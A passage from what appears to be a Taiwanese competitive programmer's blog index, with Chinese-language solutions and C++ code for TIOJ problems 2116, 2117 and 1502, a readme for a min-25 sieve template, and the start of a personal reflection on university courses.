\\triangleq \\{d : d | n\\}$。\n考慮 $\\phi: D_a \\times D_b \\to D_{ab},\\ \\phi(x, y) = xy$。$\\phi$ 是雙射的，因為存在反函數\n$$\n\\phi^{-1}: D_{ab} \\to D_a\\times D_b,\\ \\phi^{-1}(d) = (\\gcd(d,a), \\gcd(d,b))\n$$\n因此自然的 $\\sum _ {(x,y)\\in D_a\\times D_b} s(xy) = \\sum _ {(x,y)\\in D_a\\times D_b} s(\\phi(x,y)) = \\sum _ {d\\in D_{ab}} s(d)$ 反函數的驗證：\n若 $x|a, y|b$，則令 $a=ux, b=vy$，那麼 $\\gcd(xy, a) = \\gcd(xy, ux) = x \\cdot \\gcd(y, u)$，而 $\\gcd(y, u) | \\gcd(vy, ux) = \\gcd(a, b) = 1$，故 $\\gcd(y,u) = 1$，$\\gcd(xy, a)$ 確實等於 $x$。$\\gcd(xy, b) = y$ 也類似。 由引理便得\n$$\n\\begin{align*}\nh(ab)\n\u0026amp;= \\sum _ {d | ab} f(d) g(\\frac{ab}{d}) \\\\\n\u0026amp;= \\sum _ {x | a} \\sum _ {y | b} f(xy) g(\\frac{ab}{xy}) \\\\\n\u0026amp;= \\sum _ {x | a} \\sum _ {y | b} f(x)f(y) g(\\frac{a}{x})g(\\frac{b}{y}) \\\\\n\u0026amp;= \\left(\\sum _ {x | a} f(x)g(\\frac{a}{x}) \\right)\\left(\\sum _ {y | b} f(y)g(\\frac{b}{y}) \\right) \\\\\n\u0026amp;= h(a) h(b)\n\\end{align*}\n$$\n對於所有 $\\gcd(a, b) = 1$ 都成立。\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; #define all(x) begin(x), end(x) #ifdef local #define safe cerr \u0026lt;\u0026lt; __LINE__ \u0026lt;\u0026lt; \u0026#34; line \u0026#34; \u0026lt;\u0026lt; __LINE__ \u0026lt;\u0026lt; \u0026#34; safe\\n\u0026#34; #define debug(a...) debug_(#a, a) #define orange(a...) orange_(#a, a) template \u0026lt;typename ...T\u0026gt; void debug_(const char *s, T ...a) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;; int cnt = sizeof...(T); (..., (cerr \u0026lt;\u0026lt; a \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\e[0m\\n\u0026#34;))); } template \u0026lt;typename I\u0026gt; void orange_(const char *s, I L, I R) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; for (int f = 0; L != R; ++L) cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; *L; cerr \u0026lt;\u0026lt; \u0026#34; ]\\e[0m\\n\u0026#34;; } #else #define safe ((void)0) #define debug(...) safe #define orange(...) safe #endif using lld = int64_t; template \u0026lt;typename T, T MOD\u0026gt; class Modular { public: constexpr Modular() : v() {} template \u0026lt;typename U\u0026gt; Modular(const U \u0026amp;u) { v = static_cast\u0026lt;T\u0026gt;(0 \u0026lt;= u \u0026amp;\u0026amp; u \u0026lt; MOD ? u : (u%MOD+MOD)%MOD); } template \u0026lt;typename U\u0026gt; explicit operator U() const { return U(v); } T operator()() const { return v; } #define REFOP(type, expr...) Modular \u0026amp;operator type (const Modular \u0026amp;rhs) { return expr, *this; } REFOP(+=, v += rhs.v - MOD, v += MOD \u0026amp; (v \u0026gt;\u0026gt; width)) ; REFOP(-=, v -= rhs.v, v += MOD \u0026amp; (v \u0026gt;\u0026gt; width)) // fits for MOD^2 \u0026lt;= 9e18 REFOP(*=, v = static_cast\u0026lt;T\u0026gt;(1LL * v * rhs.v % MOD)) ; REFOP(/=, *this *= inverse(rhs.v)) #define VALOP(op) friend Modular operator op (Modular a, const Modular \u0026amp;b) { return a op##= b; } VALOP(+) ; VALOP(-) ; VALOP(*) ; VALOP(/) Modular operator-() const { return 0 - *this; } friend bool operator == (const Modular \u0026amp;lhs, const Modular \u0026amp;rhs) { return lhs.v == rhs.v; } friend bool operator != (const Modular \u0026amp;lhs, const Modular \u0026amp;rhs) { return lhs.v != rhs.v; } friend std::istream \u0026amp; operator\u0026gt;\u0026gt;(std::istream \u0026amp;I, Modular \u0026amp;m) { T x; I \u0026gt;\u0026gt; x, m = x; return I; } friend std::ostream \u0026amp; operator\u0026lt;\u0026lt;(std::ostream \u0026amp;O, const Modular \u0026amp;m) { return O \u0026lt;\u0026lt; m.v; } Modular inv() const { return inverse(v); } Modular qpow(uint64_t p) const { Modular r = 1, e = *this; while (p) { if (p \u0026amp; 1) r *= e; e *= e; p \u0026gt;\u0026gt;= 1; } return r; } private: constexpr static int width = sizeof(T) * 8 - 1; T v; static T inverse(T a) { // copy from tourist\u0026#39;s template T u = 0, v = 1, m = MOD; while (a != 0) { T t = m / a; m -= t * a; std::swap(a, m); u -= t * v; std::swap(u, v); } assert(m == 1); return u; } }; constexpr int mod = 1000000007; using Mint = Modular\u0026lt;int, mod\u0026gt;; signed main() { cin.tie(nullptr)-\u0026gt;sync_with_stdio(false); // f(x, k) = \\sum _ {d | x} f(d, k - 1) // f(X, K) = id * 1^K // // f_p = 1 / (1 - px) (1 - x)^K int N, K; cin \u0026gt;\u0026gt; N \u0026gt;\u0026gt; K; const int maxn = 1000025; vector\u0026lt;int\u0026gt; lpf(maxn), pc(maxn), primes; vector\u0026lt;Mint\u0026gt; f(maxn); f[1] = 1; for (int i = 2; i \u0026lt; maxn; i++) { if (lpf[i] == 0) primes.emplace_back(lpf[i] = pc[i] = i); for (int p : primes) { if (i * p \u0026gt;= maxn) break; lpf[i * p] = p; if (lpf[i] == p) { pc[i * p] = pc[i] * p; break; } else { pc[i * p] = p; } } } vector\u0026lt;Mint\u0026gt; choose(60, 1); for (int i = 0; i \u0026lt; 60; i++) { // binom(i + K - 1, i); for (int j = 1; j \u0026lt;= i; j++) choose[i] *= K + j - 1; for (int j = 1; j \u0026lt;= i; j++) choose[i] /= j; } for (int p : primes) { vector\u0026lt;Mint\u0026gt; u; for (int64_t prod = 1, c = 0; prod \u0026lt; maxn; prod *= p, ++c) { u.emplace_back(prod); } vector\u0026lt;Mint\u0026gt; v(u.size()); for (size_t i = 0; i \u0026lt; v.size(); i++) { for (size_t j = 0; j \u0026lt;= i; j++) { v[i] += u[j] * choose[i - j]; } } for (int64_t prod = 1, c = 0; prod \u0026lt; maxn; prod *= p, ++c) { f[prod] = v[c]; } } for (int i = 2; i \u0026lt; maxn; i++) if (i != pc[i]) f[i] = f[pc[i]] * f[i / pc[i]]; Mint ans = 0; for (int i = 0; i \u0026lt; N; i++) { int x; cin \u0026gt;\u0026gt; x; ans += f[x]; } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } 很懶惰就貼了 modint 的模板。pc 是維護 least prime factor 在 $n$ 裡面的冪次究竟是多少。記得初始化 f[1] = 1。\n","permalink":"https://omeletwithoutegg.github.io/2024/12/18/TIOJ-2116/","tags":["TIOJ","math","number-theory"],"title":"TIOJ 2116"},{"contents":"殿壬與最大流 https://tioj.ck.tp.edu.tw/problems/2117\nDescription $Q \\leq 2 \\times 10^5$ 次詢問無向圖 $G$ 上面任兩點的最大流（邊權是 $1$）。但是，$G$ 是一張 $N$ 點 $N$ 邊連通圖。\nSolution $N$ 點 $N$ 邊無向連通圖的結構必定是一棵樹加上一條邊，或者也可以描述成一個環上面長出許多子樹。關鍵字是 pseudo tree 或基環樹 / based ring tree。\n兩點之間的最大流必定是 $1$ 或 $2$。只有兩個點都在環上的時候才會是 $2$，其他情況都可以只拔掉一條邊就讓兩個點不連通。\n要找出哪些點在環上，可以直接 dfs 並把唯一的 backedge 所對應的樹上路徑上的點全部選起來就好。\n本題還可以一般化成仙人掌版本，兩個點必須要在同一個環上才會是 $2$，不過點仙人掌的情形也許會比較複雜一點。\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; #define all(x) begin(x), end(x) #ifdef local #define safe cerr \u0026lt;\u0026lt; __LINE__ \u0026lt;\u0026lt; \u0026#34; line \u0026#34; \u0026lt;\u0026lt; __LINE__ \u0026lt;\u0026lt; \u0026#34; safe\\n\u0026#34; #define debug(a...) debug_(#a, a) #define orange(a...) orange_(#a, a) template \u0026lt;typename ...T\u0026gt; void debug_(const char *s, T ...a) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;; int cnt = sizeof...(T); (..., (cerr \u0026lt;\u0026lt; a \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\e[0m\\n\u0026#34;))); } template \u0026lt;typename I\u0026gt; void orange_(const char *s, I L, I R) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; for (int f = 0; L != R; ++L) cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; *L; cerr \u0026lt;\u0026lt; \u0026#34; ]\\e[0m\\n\u0026#34;; } #else #define safe ((void)0) #define debug(...) safe #define orange(...) safe #endif using lld = int64_t; signed main() { cin.tie(nullptr)-\u0026gt;sync_with_stdio(false); int N; cin \u0026gt;\u0026gt; N; vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; g(N); for (int i = 0; i \u0026lt; N; i++) { int a, b; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; --a, --b; g[a].emplace_back(b); g[b].emplace_back(a); } vector\u0026lt;int\u0026gt; onCycle(N), pa(N, -1), vis(N); int dft = 0; auto dfs = [\u0026amp;](auto \u0026amp;self, int i) -\u0026gt; void { vis[i] = ++dft; for (int j : g[i]) { if (!vis[j]) { pa[j] = i; self(self, j); } else if (j != pa[i] \u0026amp;\u0026amp; vis[j] \u0026lt; vis[i]) { for (int x = i; x != j; x = pa[x]) onCycle[x] = true; onCycle[j] = true; } } }; dfs(dfs, 0); int Q; cin \u0026gt;\u0026gt; Q; while (Q--) { int a, b; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; --a, --b; if (onCycle[a] \u0026amp;\u0026amp; onCycle[b]) { cout \u0026lt;\u0026lt; 2 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } else { cout \u0026lt;\u0026lt; 1 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } } ","permalink":"https://omeletwithoutegg.github.io/2024/12/18/TIOJ-2117/","tags":["TIOJ","graph","tree","adhoc"],"title":"TIOJ 2117"},{"contents":"Every time you\u0026rsquo;re next to me https://tioj.ck.tp.edu.tw/problems/1502\nDescription 有一個字串 $T$ 和一個 pattern $P$，其中 $P$ 有一些字元是 *，* 可以匹配一個或以上的任意字元，且 * 不會連續出現，請問 $T$ 裡面有沒有一個子字串符合 $P$？\nSolution 先把 $P$ 按照 * 切段成一堆小 pattern 跟 *。如果 $T$ 有一個子字串符合 $P$ 的話，那麼一定是一堆不相交的區間剛好匹配到那些不是 * 的小 pattern，且兩個相鄰區間之間有一個以上的間隔。不難看出可以從左到右 greedy，如果當前考慮的前綴恰好匹配到第一個小 pattern的話，就可以直接當成一個「$T$ 是剩下的後綴、$P$ 是剩下的小 pattern」的子問題了。要注意 * 匹配的需要是一個以上的字元，並且 $P$ 的最前最後都可以有 *。需要用 KMP 快速維護目前最前面的小 pattern 跟目前考慮的前綴是否匹配。\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; #define all(x) begin(x), end(x) #ifdef local #define safe cerr \u0026lt;\u0026lt; __LINE__ \u0026lt;\u0026lt; \u0026#34; line \u0026#34; \u0026lt;\u0026lt; __LINE__ \u0026lt;\u0026lt; \u0026#34; safe\\n\u0026#34; #define debug(a...) debug_(#a, a) #define orange(a...) orange_(#a, a) template \u0026lt;typename ...T\u0026gt; void debug_(const char *s, T ...a) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;; int cnt = sizeof...(T); (..., (cerr \u0026lt;\u0026lt; a \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\e[0m\\n\u0026#34;))); } template \u0026lt;typename I\u0026gt; void orange_(const char *s, I L, I R) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; for (int f = 0; L != R; ++L) cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; *L; cerr \u0026lt;\u0026lt; \u0026#34; ]\\e[0m\\n\u0026#34;; } #else #define safe ((void)0) #define debug(...) safe #define orange(...) safe #endif using lld = int64_t; vector\u0026lt;int\u0026gt; KMP(const auto \u0026amp;s) { vector\u0026lt;int\u0026gt; fail(s.size()); for (int i = 1, j = 0; i \u0026lt; (int)s.size(); i++) { while (j \u0026amp;\u0026amp; s[i] != s[j]) j = fail[j - 1]; if (s[i] == s[j]) ++j; fail[i] = j; } return fail; } signed main() { cin.tie(nullptr)-\u0026gt;sync_with_stdio(false); string text, pattern; getline(cin, text); getline(cin, pattern); vector\u0026lt;string\u0026gt; patterns; { for (size_t i = 0, j; i \u0026lt; pattern.size(); i = j) { for (j = i; j \u0026lt; pattern.size(); j++) if ((pattern[i]==\u0026#39;*\u0026#39;) != (pattern[j]==\u0026#39;*\u0026#39;)) break; patterns.emplace_back(pattern.substr(i, j - i)); } } vector\u0026lt;int\u0026gt; fail = KMP(patterns.front()); for (size_t i = 0, j = 0; char c : text) { if (patterns[i] == \u0026#34;*\u0026#34;) { ++i; if (i == patterns.size()) { cout \u0026lt;\u0026lt; \u0026#34;Asssssss!!!!!\\n\u0026#34;; return 0; } fail = KMP(patterns[i]); continue; } while (j \u0026amp;\u0026amp; c != patterns[i][j]) j = fail[j - 1]; if (c == patterns[i][j]) ++j; if (j == patterns[i].size()) { j = 0; ++i; if (i == patterns.size()) { cout \u0026lt;\u0026lt; \u0026#34;Asssssss!!!!!\\n\u0026#34;; return 0; } fail = KMP(patterns[i]); } } cout \u0026lt;\u0026lt; \u0026#34;zzz...\\n\u0026#34;; } ","permalink":"https://omeletwithoutegg.github.io/2024/12/18/TIOJ-1502/","tags":["TIOJ","string","greedy"],"title":"TIOJ 1502"},{"contents":"此文只是宣告我有把 resource 和 about 大更新了一遍，不過部落格大概還是會繼續長灰塵。\n","permalink":"https://omeletwithoutegg.github.io/2024/12/14/update-notification-2024/","tags":[],"title":"更新 Resource 和 About"},{"contents":"min 25 模板使用說明 前幾個月（WF 之前）忘記為什麼就想去學 min25 篩，然後就把他模版化放進 codebook 裡了。我是看 https://oi-wiki.org/math/number-theory/min-25/ 學的，不過本文不會提到太多細節。\n先貼上 code：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 template \u0026lt;typename U, typename V\u0026gt; struct min25 { lld n; int sq; vector\u0026lt;U\u0026gt; Ss, Sl, Spre; vector\u0026lt;V\u0026gt; Rs, Rl; Sieve sv; vector\u0026lt;lld\u0026gt; quo; U \u0026amp;S(lld d) { return d \u0026lt; sq ? Ss[d] : Sl[n / d]; } V \u0026amp;R(lld d) { return d \u0026lt; sq ? Rs[d] : Rl[n / d]; } min25(lld n_) : n(n_), sq((int)sqrt(n) + 1), Ss(sq), Sl(sq), Spre(sq), Rs(sq), Rl(sq), sv(sq) { for (lld i = 1, Q; i \u0026lt;= n; i = n / Q + 1) quo.push_back(Q = n / i); } U F_prime(auto \u0026amp;\u0026amp;f, auto \u0026amp;\u0026amp;F) { for (lld p : sv.primes) Spre[p] = f(p); for (int i = 1; i \u0026lt; sq; i++) Spre[i] += Spre[i - 1]; for (lld i : quo) S(i) = F(i) - F(1); for (lld p : sv.primes) for (lld i : quo) { if (p * p \u0026gt; i) break; S(i) -= f(p) * (S(i / p) - Spre[p - 1]); } return S(n); } // F_prime: \\sum _ {p is prime, p \u0026lt;= n} f(p) V F_comp(auto \u0026amp;\u0026amp;g, auto \u0026amp;\u0026amp;h) { for (lld i : quo) R(i) = h(S(i)); for (lld p : sv.primes | views::reverse) for (lld i : quo) { if (p * p \u0026gt; i) break; lld prod = p; for (int c = 1; prod * p \u0026lt;= i; ++c, prod *= p) { R(i) += g(p, c) * (R(i / prod) - h(Spre[p])); R(i) += g(p, c + 1); } } return R(n); } // F_comp: \\sum _ {2 \u0026lt;= i \u0026lt;= n} g(i) }; // O(n^{3/4} / log n) 如果去看我們 codebook 的連結 會看到還有一串中文的註解，以下大概就是仔細的講那一串中文的註解然後隨機補充一些東西。\nDescription 這個模板要解決的問題簡單來說就是有一個積性函數 $g$，計算 $\\sum _ {i \\leq n} g(i)$。因為是積性函數，所以只要給定質數冪的值，即 $g(p^c)$，就可以對所有正整數定義 $g$ 的值。然而為了快速計算 $g$ 還必須滿足一些條件，在學 min25 篩時常常會看到「質數點 $p$ 必須是一個低階多項式」，不過其實可以更一般化。使用這個模板時必須要構造兩個 type $U, V$ 以及函數 $f, h$ 滿足以下條件：\n$U, V$ 都是環，即在上面可以定義加法、乘法，加法可交換且有反元素（可以做減法），乘法對加法有分配律。 要求 $f: \\mathbb{N} \\to U$ 是完全積性，即 $\\forall a, b \\in\\mathbb{N}, f(ab) = f(a)f(b)$。 $f$ 的前綴和 $F(i) = \\sum _ {j \\leq i} f(i)$ 可以快速求值。 對於質數 $p$，$g(p) = h(f(p))$。 $h: U \\to V$ 是一個加法上的同態，即 $h(u_1 + u_2) = h(u_1) + h(u_2)$。 給定 $p, c$ 之後，$g(p^c)$ 可以快速求值。 呼叫 F_prime 會對所有 $x \\in D_n = \\{\\lfloor \\frac{n}{i} \\rfloor | i=1,2,\\dots,n \\}$ 計算 $S(x) = \\sum _ {p \\text{ is prime}, p \\leq x} f(p)$。請注意 $F(x) = \\sum _ {i \\leq x} f(i)$，和 $S$ 不同。\n呼叫 F_comp 會對所有 $x \\in D_n$ 計算 $R(x) = \\sum _ {2 \\leq i \\leq x} g(i)$。函數回傳的值就是 $R(n)$，也就是最一開始求的值。注意這個值不會把 $g(1)$ 算進去。\n以下舉幾個例題說明。\nsum of totient function 大家很熟悉的積性函數 $\\varphi(n)$。對於質數冪，$\\varphi(p^c) = p^{c-1}(p-1)$，特別的，對於質數 $p$ 有 $\\varphi(p) = p - 1$。這滿足所謂低階多項式的條件。讓我們構造一下 $f$\n$$\n\\begin{cases}\nf(n) \u0026amp;= (1, n) \\\\\nh((s_0, s_1)) \u0026amp;= s_1 - s_0\n\\end{cases}\n$$\n其中，$U = \\mathbb{Z}^2$ 上的加法跟乘法分別都定義成逐項加跟逐項乘，即 $(a, b) + (c, d) = (a + c, b + d)$ 跟 $(a, b) \\cdot (c, d) = (ac, bd)$。可以驗證對於質數 $p$，$h(f(p)) = h((1, p)) = p - 1 = \\varphi(p)$。\n在 $g(p) = \\sum a_i p^i$ 的時候，$U$ 的構造基本上就是一個 tuple 維護 $n^0, n^1, n^2, \\dots$，而 $\\text{id}_k: n\\mapsto n^k$ 正是完全積性並且前綴和很好算的函數。$h$ 則就是把這些冪次用 $a_i$ 線性組合得到 $g$。\nsum of multiplicative function 和 sum of totient function 幾乎一樣，只是 $h$ 乘的系數稍微改一下。稍微放一點片段\n1 2 3 4 5 6 7 8 9 10 11 12 min25\u0026lt;Pair, Mint\u0026gt; m(N); m.F_prime([](Mint p) -\u0026gt; Pair { return {1, p}; }, [](Mint n) -\u0026gt; Pair { return {n, n * (n + 1) / 2}; }); Mint ans = 1 + m.F_comp([\u0026amp;](Mint p, Mint e) -\u0026gt; Mint { return a * e + b * p; }, [\u0026amp;](Pair v) -\u0026gt; Mint { return a * v[0] + b * v[1]; }); 其中 Pair 是一個定義了加法乘法減法等等的 struct，也可以直接用 std::valarray 代替，但可能會跑比較慢。\n可以看 這個 submission 或是 另一個 submission。\ncounting primes 可以只呼叫 F_prime 得到質數的個數，此時 $f(n) = 1$ 以及 $F(n) = n$。\n可見 https://judge.yosupo.jp/submission/255568 。\nLOJ #6053. 简单的函数 https://loj.ac/p/6053\n本題的 $g(p^c) = p \\oplus c$。因為質數除了 $2$ 以外都是奇數，所以 $g(p) = p - 1$，除了 $g(2) = 3$。其中一個構造如下：\n$$\n\\begin{cases}\nf(n) \u0026amp;= (1, n, [n \\text{ is odd}]) \\\\\nh((s_0, s_1, s_{parity})) \u0026amp;= s_1 + s_0 - 2 s_{parity}\n\\end{cases}\n$$\n注意到 $n \\mapsto [n \\text{ is odd}]$ 也是一個完全積性函數，並且其前綴和很好計算：介在 $[1, n]$ 的奇數數量正好就是 $\\lceil \\frac{n}{2} \\rceil$。這裡 $U = \\mathbb{Z}^3$ 並且類似的定義加法乘法。\nQOJ # 9867. Flowers 這是在 3rd ucup kunming 遇到的題目。原題有一些包裝，但總之就是要計算 $\\prod _ {i \\leq n} \\omega(i)$，其中 $\\omega(i)$ 是 $i$ 有幾種相異的質因數。因為 $n\\leq 10^{11}$，用 python 打一下可以知道 $\\omega(i) \\leq 10$。\n因為相異質因數個數很小，可以打算對於所有 $k = 1,\\dots,10$ 計算有幾個 $i$ 使得 $\\omega(i) = k$ 之後再快速冪計算原題要求的答案。為了數有幾個相異質因數，構造 $V = \\mathbb{Z}[x]$ 為多項式，而 $g(p^c) = x$，這樣當 $i$ 有 $k$ 個相異質因數，$g(i)$ 就會等於 $x^k$，而 $\\sum _ {2\\leq i \\leq n} g(i)$ 就是我們想要統計的東西。\n接著想要構造一個前綴和很好算的 $f$ 使得在質數點 $f$ 和 $g$ 可以通過 $h$ 轉換。從 $\\sum _ {p\\in\\mathbb{P} _ {\\leq n}} g(p) = \\pi(n) x$ 可以看出（hint: $\\sum _ {p\\in\\mathbb{P} _ {\\leq n}} g(p) = \\sum _ {p\\in\\mathbb{P} _ {\\leq n}} h(f(p)) = h\\left( \\sum _ {p\\in\\mathbb{P} _ {\\leq n}} f(p) \\right)$，不限於此題）在 F_prime 階段要計算的大概就會是質數數量，不妨構造 $f(n) = 1$ 以及 $h(s) = sx$。\n因為 $\\omega(i) \\leq 10$，所以本題的多項式 degree 也小於等於 $10$，因此我的實做是直接暴力 $10\\times 10$ 寫乘法，但實際上也可以用 NTT，或甚至在一開始任選 11 個數字，然後在 min25 篩計算他們帶入多項式的點值的和，最後再用拉格朗日插值或高斯消去等方法得出答案的多項式，不過嫌麻煩就沒有把這個 10 壓掉也是過了。\n另外一點我想提的是 F_comp 有另外一個寫法是用 top-down dfs 甚至不記憶化 的寫法去計算，應該是 OI-wiki 上的所謂 $\\mathcal{O}(n^{1-\\varepsilon})$ 的作法，大概跟 F_comp 想做的事情差不多。把 F_comp 滾動掉的那個維度 explicit 的寫出來就會變成下面這樣：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 V F_comp_dfs(auto \u0026amp;\u0026amp;g, auto \u0026amp;\u0026amp;h) { auto dfs = [\u0026amp;](auto \u0026amp;\u0026amp;self, size_t k, lld x) -\u0026gt; V { V ans = h(S(x)); for (size_t i = k; i \u0026lt; sv.primes.size(); i++) { const lld p = sv.primes[i]; if (p * p \u0026gt; x) break; lld prod = p; for (int c = 1; prod * p \u0026lt;= x; ++c, prod *= p) { ans += g(p, c) * (self(self, i + 1, x / prod) - h(Spre[p])); ans += g(p, c + 1); } } return ans; }; return dfs(dfs, 0, n); } 節錄自 這個 submission。本文的這個 $\\mathcal{O}(n^{\\frac{3}{4}} \\log ^{-1} n)$ 複雜度好像會在中國被分類成洲閣篩？而 dfs 的寫法才被叫做 min25 篩。複雜度雖然是 $\\mathcal{O}(n^{1-\\varepsilon})$ 但在競程範圍內算是蠻快的，如果 F_comp 特別慢的題目，例如 QOJ 那題，會有顯著加速。\nTime Complexity $\\mathcal{O}(n^{\\frac{3}{4}} / \\log n)$。從程式碼裡面就可以看出來（注意到 quo 是從大到小枚舉） F_prime 的複雜度是\n$$\n\\sum _ {p \\text{ is prime}, p \\leq \\sqrt{n}} \\sum _ {x \\in D_n} [p^2 \\leq x]\n= \\sum _ {x\\in D_n} \\pi(\\sqrt{x})\n\\leq \\sum _ {i^2 \\leq n} \\pi(\\sqrt{i}) + \\sum _ {i^2 \\leq n} \\pi(\\sqrt{\\frac{n}{i}})\n\\approx \\sum _ {i^2 \\leq n} \\frac{\\sqrt{i}}{\\ln{\\sqrt{i}}} + \\sum _ {i^2 \\leq n} \\frac{\\sqrt{\\frac{n}{i}}}{\\ln{\\sqrt{\\frac{n}{i}}}}\n$$\n後續就懶得證了。應該可以在隨意的 $n^c$ 切一刀，一半把分母當成 $1$ 積分也只會是 $O(n^{\\frac{3}{4}-\\varepsilon})$，另一半則是可以把 $\\ln(\\cdots)$ 當成 $\\log(n)$ 的常數倍。F_comp 的複雜度應該也可以證明是一樣的。\n空間跟 $D_n$ 集合的大小一樣是 $\\mathcal{O}(\\sqrt{n})$。\nCaveats 這份程式碼並沒有直接要求 $U, V$ 的加法單位元和乘法單位元（$0, 1$），但都預設空的 vector 會是 $0$，並且因為 $f, g$ 是積性的，定義上應該要滿足 $f(1) = 1_U, g(1) = 1_V$。\n另外，完全積性函數這個條件，我懷疑其實也是可以拿掉的。在第一階段（F_prime）我們會把包含小質數的數字全部扣掉，這相當於是跟 $f^{-1}$ 做捲積，而當 $f$ 是完全積性函數，inverse 會非常好算：$f_p^{-1}(x) = 1 - f(p)x$（見貝爾級數），若 $f$ 不是完全積性的，inverse 要花點力氣算。不過，我們仍然會需要構造一個前綴和很好算的積性函數 $f$，這是這個演算法的大前提。把完全積性的條件改掉之後可能常數會差一點，而且當初寫的時候沒有想這麼多。\n這份程式碼如果 $f,g,h,F$ 都是 $\\mathcal{O}(1)$ 的話，大概可以跑 $10^{10}$ 到 $10^{11}$。因為據說有 $\\tilde{\\mathcal{O}}(\\sqrt{N})$ 的演算法了所以就去翻了一堆文章，還是連同樣條件下的 $\\mathcal{O}(n^{\\frac{2}{3}} \\log^{-1}n)$ 的版本也寫不出來。去翻 library checker 的各種 top coder 好像也都是 $\\tilde{\\mathcal{O}}(n^{\\frac{2}{3}})$ 的複雜度的。只有再次學會了杜教篩，寫了一個帶 template 的模板過了 sum_of_totient_function，但跟本文的模板比也只是 192ms 跟 397ms 的差距而已。\n","permalink":"https://omeletwithoutegg.github.io/2024/12/10/min-25-template-readme/","tags":["math","number-theory","template"],"title":"min 25 模板使用說明"},{"contents":"Fourth semester 拖到了大四上快結束才寫，基本上是看著課表回憶一下大概而已。\n這學期的成績看起來不是很好看。\n桌球初級 可以說是蠻輕鬆的課，老師會從看起來真的很基本的握拍開始教起，然後發球、回球等等，最後面會用餵球的方式讓我們試著左推右攻。\n老師讓全班的人每四個人分一組，每節課就是先集合起來講解動作之後，四個人回到同一桌輪流互相練習。我們這一桌有一個日本人，不過剛好也有一位日文系的同學，感覺有點形成他們兩位女生的小泡泡（？）\n因為小學的時候就有打過一點點桌球（超級一點點），所以至少發球跟握拍還是會的。從考試成績看起來看似我在這組的實力還算不錯，但考的東西應該算是非常簡單，而且後面有一些課的練習是會讓贏家輪換到別桌去，也遇到很多很厲害的同學 (a.k.a. 他們在炸魚）。\nA+ 率是 76.92%，非常高，我也拿了 A+。後半學期的考試我個人覺得隊友的餵球影響會很重，所以如果自己真的真的完全沒有基礎的話最好找厲害一點的隊友餵球。\n語言的邏輯分析 因為之前上過探索語言覺得語言很有趣就想說來聽聽看，第一堂課就丟給我們語奧那種題目試著做（老師稱作「語言遊戲」）。因為是第一堂課所以難度非常簡單，我就修下去這門課了。\n不過其實是上了賊船。每個禮拜都會有作業，形式一樣是語奧的題目，但是要順便交上合理的解題過程，而且感覺要好好引用上課教的一些語言 feature，這個作業寫到後面越來越不會寫，而且在講解的部份我也聽不太懂為什麼某些回答是合理的理由。總之就是太菜了。\n但真正困難的其實是期末報告。期末我們要分組製作一個「語言遊戲」，但在分組的時候所有積極的人迅速的就找好組了，所以我就變成跟剩下來的人想辦法湊成一組。然後大家都不太知道能做什麼以及到報告前一週都沒什麼進度，想辦法用 chatgpt 